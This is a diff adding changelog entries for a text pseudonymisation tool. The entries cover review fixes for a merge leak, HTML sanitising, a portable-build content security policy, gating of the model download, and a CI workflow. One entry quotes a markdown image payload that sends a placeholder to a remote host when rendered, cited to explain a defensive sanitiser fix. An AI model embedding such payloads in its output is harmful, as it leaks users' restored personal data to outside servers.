@@ -30,6 +30,19 @@ _Working version: 0.19.0-dev._
   - Review follow-up, NER limits: `nerClient.ts` refused text over 100,000 characters while `nerLimits.ts` only asked for confirmation above 200,000, so the confirmation offered a run that then failed. Now `NER_MAX_CHARS` 100,000 (shared) and `NER_LONG_DOCUMENT_CHARS` 25,000. The 180 s whole-run timeout (which included the model download and, since chunking, ~150 inferences) is an idle timeout: the worker posts a `chunk` message per window and the client rearms on every message (`NER_IDLE_TIMEOUT_MS`).
   - Known gaps: bare given names in prose (`Falei con Roi`), region inside a law title (`… de Galicia`), head-final English acts (`Tenant Act`).
 
+### Bugs
+
+- Full project review, plan `docs/plans/M06-03-Review-fixes-plan.md` (PR #19). Findings came from reading the code; the portable build was also loaded in headless Chrome.
+  - Merge leak: `handleMerge` in `App.tsx` built the merged entry as `{ ...first, variants }`, keeping only the first entry's `occurrences`. `applyEnabledMappings` replaces by occurrence when every mapping has them, so the other merged values were written back in clear. Split and merge moved to pure `src/core/mappingEdits.ts` (`splitMapping`, `mergeMappings`) with tests; merge concatenates occurrences (or drops them all if any entry has none, which selects the text-search path), split assigns occurrences by surface spelling instead of dropping them.
+  - Remote resources in the restored view: `DOMPurify.sanitize()` defaults keep `<img src>`, `<video>`, `<style>` and `style="…url()"`. A reply with `![](https://host/?q=[[NAME_001]])` was restored and then requested by the browser. New `src/lib/sanitizeHtml.ts` (`sanitizeRenderedHtml`): private DOMPurify instance, HTML profile only, resource-loading tags and attributes forbidden, `<img>` replaced by its alt text. Test runs in the jsdom project (`vitest.config.ts`), since DOMPurify is a no-op without a DOM.
+  - Portable CSP: the hosted build's `_headers` CSP never applied to `dist-portable/index.html`. `scripts/portableBuild.ts` now injects a `<meta http-equiv="Content-Security-Policy">` (`PORTABLE_CSP`: `img-src 'self' data: blob: file:`, `media-src`/`object-src`/`frame-src`/`form-action`/`base-uri` `'none'`, `font-src 'self' data:`). No script/worker/connect directives on purpose. Checked in headless Chrome 157 from `file://`: app renders, no exceptions, a remote `<img>` raises `securitypolicyviolation`, a `data:` image loads.
+  - Hard rule 2: `modelDownloadAllowed()` had no caller, so every build showed `NerToggle`. `App.tsx` now renders it only when allowed and `handleNerToggle` refuses otherwise; pure `modelDownloadAllowedAt()` is tested. `.env.development` sets `VITE_ALLOW_MODEL_DOWNLOAD=1` for `npm run dev` only.
+  - `src/core/export/textExport.ts`: exported HTML uses `--color-text`, `--color-accent-subtle`, `--color-mark-text` values instead of the pre-rebrand purple.
+
+### Maintenance
+
+- `.github/workflows/ci.yml`: lint, tests, both builds and `scripts/check-no-analytics.sh` on pull requests and pushes to `main` (`deploy.yml` is manual-only since 2026-10-07, so nothing ran them).
+
 ## [0.18.6] - 2026-11-01
 
 ### Bugs
